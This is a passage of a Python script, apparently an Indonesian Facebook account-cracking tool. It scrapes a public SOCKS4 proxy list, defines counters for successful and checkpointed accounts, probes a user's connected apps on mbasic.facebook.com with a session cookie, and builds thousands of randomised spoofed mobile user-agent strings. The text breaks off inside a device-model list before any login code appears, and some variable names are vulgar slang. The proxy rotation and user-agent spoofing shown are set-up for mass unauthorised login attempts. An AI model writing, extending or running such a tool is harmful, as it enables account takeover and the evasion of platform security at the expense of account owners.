import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as Ngangkang
from bs4 import BeautifulSoup
from datetime import datetime

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)
P, M, K, B, H, J, A, O = '\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[38;5;208m','\x1b[1;90m','\x1b[0;33m'

id,memek,loop,ok,cp=[],[],0,0,0

bln = ["januari","februari","maret","april","mei","juni","juli","agustus","september","oktober","november","desember"]
now = datetime.now()
tanggal = now.day
blx = now.month

try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

bulan = bln[xx]
tahun = now.year
simpan = str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU



ses=requests.Session()
ses=requests.session()
     
def cek_apk(ses,coki):
    w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'{P}Active Apps {O}&&{P} Web site Status not Connected')
    else:
        print(f'{O}Active Apps {O}&&{O} Web site Status')
        for i in range(len(game)):
            print(f"{P}[%s%s] {GREEN}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'{N}Expired Apps {B}&&{N} Web site Status not Connected')
    else:
        print(f'{P}Expired Apps {B}&&{P} Web site Status')
        for i in range(len(game)):
            print(f"{N}[%s%s]{B} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
            
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
usragent = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ugen=[]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(1000, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
 
 
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(1000, 9999)
	c=random.randrange(1000, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 
 #------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 13; moto tab g70 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.1695.241 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 6; GT-I9190|KOT49H Build/NK7T7Q)10  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/16.0.5219.83 UCBrowser/7.2.0.999 Mobile Safari/537.36 OPR/32.9.1034.58173",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/125.0 Mobile/15E148 Safari/605.1.15",]
ua = ["Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0; Samsung KT10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-N976U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 BingSapphire/21.0.390225302",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3740) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36 OPR/76.1.4027.73300",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; ZC551KL Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.1.2246.123029",]
ua = ["Mozilla/5.0 (Linux; Android 5.0; R7Plus Build/LRX21M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00G Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 YaBrowser/18.1.2.70.00 Mobile Safari/537.36",]

for xd in range(10000):
	rr = random.randint
	build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
	bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
	oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
	infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
	redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
	um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
	ugen.append(um2)
	ugen.append(um3)
	ugen.append(um1)
	ugen.append(um4)
for xhd in range(1000):
	a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
	b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	b2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	c2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	d = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO {b}{str(random.randint(10,99))}{c} Build/{b2}{str(random.randint(1,999))}{c2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
	ugen.append(d)
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT